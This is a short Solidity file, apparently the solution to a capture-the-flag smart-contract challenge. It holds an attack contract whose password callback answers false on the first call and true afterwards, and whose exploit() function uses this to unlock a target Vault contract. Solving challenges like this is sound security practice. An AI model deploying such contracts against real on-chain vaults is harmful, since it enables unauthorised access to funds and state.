// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/intermediateChalls/Vault.sol";

contract attackVault {
	Vault originalContract;
	uint public i = 0;

	constructor(address _originalContract) public {
		originalContract = Vault(_originalContract);
	}

	function isGoodPassword(uint _password) external returns (bool) {
		if (i == 0) {
			i = 1;
			return false;
		}
		return true;
	}

	function exploit() public {
		originalContract.unlockVault(10);
	}
}